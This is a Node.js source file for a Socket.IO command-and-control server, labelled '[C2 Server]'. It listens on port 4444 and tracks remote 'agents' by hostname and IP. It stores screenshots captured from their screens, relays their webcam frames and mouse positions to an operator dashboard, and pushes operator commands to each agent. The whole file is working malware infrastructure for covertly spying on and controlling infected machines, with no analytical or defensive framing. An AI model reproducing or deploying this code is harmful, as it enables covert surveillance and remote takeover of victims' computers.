const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: '*' },
  maxHttpBufferSize: 50 * 1024 * 1024 // 50MB for screenshots
});

app.use(express.static('public'));
app.use('/screenshots', express.static(path.join(__dirname, 'screenshots')));

// Ensure screenshots directory exists
if (!fs.existsSync('screenshots')) fs.mkdirSync('screenshots');
if (!fs.existsSync('webcam')) fs.mkdirSync('webcam');

// Store connected agents
const agents = new Map();
const agentScreenshots = new Map();

io.on('connection', (socket) => {
  console.log(`[+] New connection: ${socket.id}`);

  // --- Agent registration ---
  socket.on('agent:register', (data) => {
    const agentId = data.id || uuidv4();
    agents.set(agentId, {
      id: agentId,
      socketId: socket.id,
      hostname: data.hostname || 'unknown',
      platform: data.platform || 'unknown',
      ip: data.ip || socket.handshake.address,
      connectedAt: Date.now(),
      lastSeen: Date.now()
    });
    socket.agentId = agentId;
    socket.agentType = 'agent';
    console.log(`[+] Agent registered: ${agentId} (${data.hostname})`);
    socket.emit('agent:registered', { id: agentId });
    io.emit('dashboard:agents', Array.from(agents.values()));
  });

  // --- Agent sends screenshot ---
  socket.on('agent:screenshot', (data) => {
    const agentId = socket.agentId;
    if (!agentId) return;
    const filename = `${agentId}_${Date.now()}.png`;
    const filepath = path.join(__dirname, 'screenshots', filename);
    const buffer = Buffer.from(data.image, 'base64');
    fs.writeFileSync(filepath, buffer);
    
    agentScreenshots.set(agentId, {
      filename,
      path: `/screenshots/${filename}`,
      timestamp: Date.now()
    });
    
    // Forward to dashboard viewing this agent
    io.to(`agent:${agentId}`).emit('dashboard:screenshot', {
      image: data.image,
      timestamp: Date.now()
    });
  });

  // --- Agent sends webcam frame ---
  socket.on('agent:webcam', (data) => {
    const agentId = socket.agentId;
    if (!agentId) return;
    io.to(`agent:${agentId}`).emit('dashboard:webcam', {
      image: data.image,
      timestamp: Date.now()
    });
  });

  // --- Agent sends mouse position ---
  socket.on('agent:mouse', (data) => {
    const agentId = socket.agentId;
    if (!agentId) return;
    io.to(`agent:${agentId}`).emit('dashboard:mouse', {
      x: data.x,
      y: data.y,
      timestamp: Date.now()
    });
  });

  // --- Dashboard subscribes to an agent ---
  socket.on('dashboard:subscribe', (agentId) => {
    socket.join(`agent:${agentId}`);
    socket.currentAgent = agentId;
    socket.agentType = 'dashboard';
    console.log(`[+] Dashboard ${socket.id} subscribed to ${agentId}`);
    
    // Send latest screenshot if available
    const last = agentScreenshots.get(agentId);
    if (last) {
      const imgData = fs.readFileSync(path.join(__dirname, last.path));
      socket.emit('dashboard:screenshot', {
        image: imgData.toString('base64'),
        timestamp: last.timestamp
      });
    }
  });

  // --- Dashboard sends command to agent ---
  socket.on('dashboard:command', (data) => {
    const agent = agents.get(data.agentId);
    if (agent) {
      io.to(agent.socketId).emit('agent:command', data.command);
    }
  });

  // --- Disconnect ---
  socket.on('disconnect', () => {
    if (socket.agentType === 'agent' && socket.agentId) {
      agents.delete(socket.agentId);
      agentScreenshots.delete(socket.agentId);
      io.emit('dashboard:agents', Array.from(agents.values()));
      console.log(`[-] Agent disconnected: ${socket.agentId}`);
    }
  });
});

const PORT = process.env.PORT || 4444;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[C2 Server] Running on http://0.0.0.0:${PORT}`);
});
